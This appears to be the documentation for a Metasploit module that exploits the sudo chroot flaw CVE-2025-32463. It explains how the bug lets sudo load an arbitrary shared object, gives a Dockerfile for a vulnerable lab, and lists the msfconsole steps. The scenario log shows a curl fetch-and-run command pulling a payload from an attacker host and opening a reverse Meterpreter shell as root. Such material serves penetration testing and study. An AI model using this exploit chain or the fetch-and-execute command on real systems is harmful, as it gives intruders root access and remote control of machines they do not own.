## Vulnerable Application


Sudo before version 1.9.14-1.9.17p1 allows user to use `chroot` option, when executing command. The option is intended to run a command with user-selected root directory (if sudoers file allow it). Change in version 1.9.14 allows resolving paths via `chroot` using user-specified root directory when sudoers is still evaluating. This allows the attacker to trick Sudo into loading arbitrary shared object. As target shared object, Name Service Switch (NSS) operations are trigged before resolving sudoers, but after running `chroot` syscall. The module requires existing session and requires compiler on target machine (e.g. `gcc`). 

## Installation

1. Create `Dockerfile`:
```
# ----- Dockerfile -----
FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get install -y build-essential wget libpam0g-dev libselinux1-dev zlib1g-dev \
                       pkg-config libssl-dev git ca-certificates && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /opt
RUN wget https://www.sudo.ws/dist/sudo-1.9.16p2.tar.gz && \
    tar xzf sudo-1.9.16p2.tar.gz && \
    cd sudo-1.9.16p2 && \
    ./configure --disable-gcrypt --prefix=/usr && make && make install

RUN useradd -m -s /bin/bash msfuser

USER msfuser
WORKDIR /home/msfuser

CMD ["/bin/bash"]
```
1. `docker build -t sudo-chroot .`
1. `docker run -it --rm --privileged sudo-chroot`


## Verification Steps


1. Start msfconsole
2. Get existing session to low-privileged user
3. Do: `use linux/local/sudo_chroot_cve_2025_32463`
4. Set target payload
5. Do: `set lhost [attacker IP address]`
6. Do: `set lport [attacker port]`
7. Do: `run`

## Options

### COMPILE

Option setting if compile target payload on the target.

### COMPILER

Option setting the compiler to compile target payload.


## Scenarios

```
msf6 exploit(linux/local/sudo_chroot_cve_2025_32463) > run verbose=true 
[*] Command to run on remote host: curl -so ./YoGpAgWbO http://192.168.168.128:8080/Q7JGOkCYlO14PhxIQeJRIQ;chmod +x ./YoGpAgWbO;./YoGpAgWbO&
[*] Fetch handler listening on 192.168.168.128:8080
[*] HTTP server started
[*] Adding resource /Q7JGOkCYlO14PhxIQeJRIQ
[*] Started reverse TCP handler on 192.168.168.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Running version 1.9.16.2
[*] Writing '/tmp/Xw1XwkTPC' (117 bytes) ...
[*] Max line length is 65537
[*] Writing 117 bytes in 1 chunks of 420 bytes (octal-encoded), using printf
[*] Creating directory /tmp/ugJjJFSc9q
[*] /tmp/ugJjJFSc9q created
[*] Max line length is 65537
[*] Writing 216 bytes in 1 chunks of 763 bytes (octal-encoded), using printf
[*] Client 192.168.168.140 requested /Q7JGOkCYlO14PhxIQeJRIQ
[*] Sending payload to 192.168.168.140 (curl/8.14.1)
[*] Transmitting intermediate stager...(126 bytes)
[*] Launching exploit...
[*] Sending stage (3090404 bytes) to 192.168.168.140
[+] Deleted /tmp/Xw1XwkTPC
[+] Deleted /tmp/ugJjJFSc9q
[*] Meterpreter session 10 opened (192.168.168.128:4444 -> 192.168.168.140:41672) at 2025-07-10 16:12:58 +0200

meterpreter > sysinfo 
Computer     : kali.kali
OS           : Debian  (Linux 6.12.25-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
```
